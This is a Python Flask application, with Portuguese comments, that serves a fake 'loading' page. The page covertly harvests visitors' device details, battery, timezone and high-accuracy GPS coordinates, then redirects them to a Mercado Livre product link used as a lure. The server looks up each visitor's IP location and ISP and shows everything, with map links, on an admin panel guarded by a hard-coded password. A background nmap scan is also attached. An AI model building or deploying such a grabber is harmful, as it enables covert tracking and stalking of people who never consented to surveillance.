from flask import Flask, render_template_string, request, jsonify
import datetime
import urllib.request
import json
import nmap
import threading
from user_agents import parse

app = Flask(__name__)

# Listas separadas para armazenar os registros na memória
registros_gps = []
registros_ip = []

# Senha simples para o seu painel
SENHA_ADMIN = "123123"

# Página HTML de Captura (Coleta hardware, bateria, rede, fuso horário e tenta GPS)
HTML_CAPTURA = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 20%; background-color: #f4f4f9; }
        h2 { color: #333; }
    </style>
</head>
<body>
    <h2>Carregando conteúdo, por favor aguarde...</h2>
    <script>
        // Coleta dados avançados do dispositivo cliente via JS
        async function coletarDadosCliente() {
            let infoHardware = {
                hardwareConcurrency: navigator.hardwareConcurrency || 'Desconhecido',
                deviceMemory: navigator.deviceMemory || 'Desconhecido',
                platform: navigator.platform || 'Desconhecido',
                language: navigator.language || 'Desconhecido',
                languages: navigator.languages ? navigator.languages.join(', ') : 'Desconhecido',
                cookieEnabled: navigator.cookieEnabled ? 'Sim' : 'Não',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                connectionType: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType.toUpperCase() : 'Desconhecido',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Desconhecido',
                bateria: 'Não suportado',
                resolucqao: window.screen.width + 'x' + window.screen.height,
                colorDepth: window.screen.colorDepth + ' bits'
            };

            if (navigator.getBattery) {
                try {
                    let bat = await navigator.getBattery();
                    infoHardware.bateria = Math.round(bat.level * 100) + '% (' + (bat.charging ? 'Carregando' : 'Descarga') + ')';
                } catch(e) {}
            }

            fetch('/salvar-ip', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(infoHardware)
            }).catch(e => console.log(e));
        }

        coletarDadosCliente();

        function enviarLocalizacao(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            fetch('/salvar-loc', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ latitude: lat, longitude: lon, precisao: accuracy })
            }).then(() => {
                window.location.href = "https://www.mercadolivre.com.br/onimusha-way-of-the-sword-ps5/p/MLB76247569";
            });
        }

        function erroLocalizacao(error) {
            console.log("Erro ou negado: " + error.message);
            window.location.href = "https://www.mercadolivre.com.br/onimusha-way-of-the-sword-ps5/p/MLB76247569";
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(enviarLocalizacao, erroLocalizacao, {
                enableHighAccuracy: true,
                timeout: 8000,
                maximumAge: 0
            });
        } else {
            window.location.href = "https://www.mercadolivre.com.br/onimusha-way-of-the-sword-ps5/p/MLB76247569";
        }
    </script>
</body>
</html>
"""

# Painel Administrativo em Estilo Retro / COBOL com Auto-Refresh de 5 segundos
HTML_PAINEL = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>MAINFRAME TERMINAL - CONSOLE COBOL v3.0</title>
    <style>
        body { 
            font-family: 'Courier New', Courier, monospace; 
            margin: 0; 
            padding: 20px; 
            background: #000084; 
            color: #FFFFFF; 
        }
        h2, h3 { 
            color: #FF5555; 
            text-transform: uppercase; 
            border-bottom: 2px dashed #FF5555;
            padding-bottom: 5px;
        }
        .container { max-width: 1400px; margin: auto; }
        table { 
            width: 100%; 
            border-collapse: collapse; 
            background: #000042; 
            margin-top: 15px; 
            margin-bottom: 30px;
            border: 2px solid #FF5555;
        }
        th, td { 
            border: 1px solid #FF5555; 
            padding: 8px 10px; 
            text-align: left; 
            font-size: 12px;
        }
        th { 
            background: #000021; 
            color: #FFFF55; 
            font-weight: bold;
        }
        tr:hover { background: #000063; }
        a { color: #55FFFF; text-decoration: underline; font-weight: bold; }
        a:hover { color: #FF5555; }
        .aviso-vazio { color: #FF8888; text-align: center; font-style: italic; }
        .system-info { font-size: 11px; color: #55FF55; margin-bottom: 20px; }
        .badge-porta { background: #005500; color: #AAFFAA; padding: 2px 5px; border: 1px solid #55FF55; font-size: 11px; display: inline-block; margin: 2px; }
        .badge-info { color: #55FFFF; }
    </style>
</head>
<body>
<div class="container">
    <h2>=== MAINFRAME SECURITY CONSOLE // SISTEMA COBOL V3.0 ===</h2>
    <div class="system-info">
        STATUS: ONLINE | AUTO-REFRESH: 5s | NMAP ENGINE: ACTIVE | PROTOCOL: SECURE-TCP/IP
    </div>

    <h3>[ TABELA 1: CAPTURAS DE GEOLOCALIZAÇÃO GPS ]</h3>
    <p>Total de Registros GPS: {{ gps|length }}</p>
    <table>
        <tr>
            <th>DATA / HORA</th>
            <th>IP ORIGEM</th>
            <th>LATITUDE / LONGITUDE</th>
            <th>PRECISÃO</th>
            <th>MAPA EXTERNO</th>
        </tr>
        {% for r in gps %}
        <tr>
            <td>{{ r.data }}</td>
            <td>{{ r.ip }}</td>
            <td>{{ r.lat }}, {{ r.lon }}</td>
            <td>{{ r.precisao }}m</td>
            <td><a href="{{ r.maps }}" target="_blank">[ABRIR MAPA]</a></td>
        </tr>
        {% else %}
        <tr><td colspan="5" class="aviso-vazio">>> NENHUM DADO DE GPS CAPTURADO AINDA <<</td></tr>
        {% endfor %}
    </table>

    <h3>[ TABELA 2: INTELIGÊNCIA DE REDE, HARDWARE & NMAP SCAN ]</h3>
    <p>Total de Registros: {{ ips|length }}</p>
    <table>
        <tr>
            <th>DATA / HORA</th>
            <th>IP / GEO / REDE</th>
            <th>ISP / PROVEDOR</th>
            <th>HARDWARE / DISPOSITIVO (JS)</th>
            <th>AMBIENTE & NAVEGADOR (USER-AGENT)</th>
            <th>PORTAS ABERTAS (NMAP LAB)</th>
        </tr>
        {% for r in ips %}
        <tr>
            <td>{{ r.data }}</td>
            <td>
                {{ r.ip }}<br>
                <span style="color: #FFFF55;">{{ r.cidade }}/{{ r.estado }} ({{ r.pais }})</span><br>
                Rede: <span class="badge-info">{{ r.hw.connectionType }}</span>
            </td>
            <td>{{ r.isp }}</td>
            <td>
                CPU Cores: {{ r.hw.hardwareConcurrency }}<br>
                RAM Aprox: {{ r.hw.deviceMemory }} GB<br>
                Bateria: {{ r.hw.bateria }}<br>
                Tela: {{ r.hw.resolucqao }} ({{ r.hw.colorDepth }})<br>
                Toque: {{ r.hw.maxTouchPoints }} pts | Cookies: {{ r.hw.cookieEnabled }}<br>
                Fuso: {{ r.hw.timezone }}
            </td>
            <td>
                <b>OS:</b> {{ r.ua_info.os }}<br>
                <b>Browser:</b> {{ r.ua_info.browser }}<br>
                <b>Device:</b> {{ r.ua_info.device }}<br>
                <b>Idioma:</b> {{ r.hw.language }} ({{ r.hw.languages }})<br>
                <details style="margin-top: 5px;">
                    <summary style="cursor: pointer; color: #55FFFF;">Ver User-Agent bruto</summary>
                    <small style="word-break: break-all; color: #AAAAAA;">{{ r.user_agent }}</small>
                </details>
            </td>
            <td>
                {% if r.portas %}
                    {% for p in r.portas %}
                        <span class="badge-porta">Porta {{ p.porta }}: {{ p.servico }} ({{ p.estado }})</span><br>
                    {% endfor %}
                {% else %}
                    <span style="color: #FFAAAA;">Varredura em execução...</span>
                {% endif %}
            </td>
        </tr>
        {% else %}
        <tr><td colspan="6" class="aviso-vazio">>> NENHUM REGISTRO CAPTURADO AINDA <<</td></tr>
        {% endfor %}
    </table>
</div>

<script>
    // Atualiza a tela automaticamente a cada 5 segundos mantendo a query string (senha)
    setTimeout(function(){
        window.location.reload();
    }, 5000);
</script>
</body>
</html>
"""

def executar_nmap_background(registro_ref):
    """Executa varredura Nmap demonstrativa no alvo padrão de testes (scanme.nmap.org)"""
    try:
        nm = nmap.PortScanner()
        nm.scan('scanme.nmap.org', arguments='-p 22,80,9929,31337 --open -T4')
        
        portas_encontradas = []
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                lport = nm[host][proto].keys()
                for p in lport:
                    estado = nm[host][proto][p]['state']
                    servico = nm[host][proto][p]['name']
                    portas_encontradas.append({"porta": p, "estado": estado, "servico": servico})
        
        registro_ref["portas"] = portas_encontradas
    except Exception as e:
        print(f"Erro no Nmap: {e}")
        registro_ref["portas"] = [{"porta": "N/A", "estado": "erro", "servico": "bloqueado"}]

@app.route('/')
def index():
    return render_template_string(HTML_CAPTURA)

@app.route('/salvar-loc', methods=['POST'])
def salvar_loc():
    dados = request.json
    lat = dados.get('latitude')
    lon = dados.get('longitude')
    precisao = dados.get('precisao')
    
    ip_cliente = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip_cliente:
        ip_cliente = ip_cliente.split(',')[0].strip()
        
    agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    maps_link = f"https://www.google.com/maps?q={lat},{lon}"
    
    registros_gps.insert(0, {
        "data": agora,
        "ip": ip_cliente,
        "lat": lat,
        "lon": lon,
        "precisao": precisao,
        "maps": maps_link
    })
    
    return jsonify({"status": "sucesso"})

@app.route('/salvar-ip', methods=['POST'])
def salvar_ip():
    ip_cliente = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip_cliente:
        ip_cliente = ip_cliente.split(',')[0].strip()
        
    user_agent_str = request.headers.get('User-Agent', 'Desconhecido')
    
    # Processa o User-Agent usando o pacote user-agents
    parsed_ua = parse(user_agent_str)
    ua_info = {
        "os": f"{parsed_ua.os.family} {parsed_ua.os.version_string}".strip(),
        "browser": f"{parsed_ua.browser.family} {parsed_ua.browser.version_string}".strip(),
        "device": f"{parsed_ua.device.brand or ''} {parsed_ua.device.model or ''} ({'Mobile' if parsed_ua.is_mobile else 'Tablet' if parsed_ua.is_tablet else 'PC'})".strip()
    }

    dados_hw = request.json or {}
    agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    cidade, estado, pais, isp = "Desconhecido", "Desconhecido", "Desconhecido", "Desconhecido"
    try:
        if ip_cliente != "127.0.0.1" and ip_cliente != "localhost":
            url = f"http://ip-api.com/json/{ip_cliente}?lang=pt-BR"
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=2) as response:
                data = json.loads(response.read().decode())
                if data.get('status') == 'success':
                    cidade = data.get('city', 'Desconhecido')
                    estado = data.get('regionName', 'Desconhecido')
                    pais = data.get('country', 'Desconhecido')
                    isp = data.get('isp', 'Desconhecido')
    except Exception as e:
        print("Erro IP-API:", e)
        
    novo_registro = {
        "data": agora,
        "ip": ip_cliente,
        "cidade": cidade,
        "estado": estado,
        "pais": pais,
        "isp": isp,
        "hw": dados_hw,
        "ua_info": ua_info,
        "user_agent": user_agent_str,
        "portas": []
    }
    
    registros_ip.insert(0, novo_registro)
    
    # Executa Nmap assíncrono
    t = threading.Thread(target=executar_nmap_background, args=(novo_registro,))
    t.start()
    
    return jsonify({"status": "sucesso"})

@app.route('/admin', methods=['GET'])
def admin():
    senha_informada = request.args.get('senha', '')
    if senha_informada != SENHA_ADMIN:
        return """
        <body style="font-family: 'Courier New'; background: #000; color: #FF5555; text-align: center; margin-top: 15%;">
            <h2>ACCESS DENIED - INVALID CREDENTIALS</h2>
            <p>Informe a senha correta na URL: <code>/admin?senha=SUA_SENHA</code></p>
        </body>
        """, 403
        
    return render_template_string(HTML_PAINEL, gps=registros_gps, ips=registros_ip)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)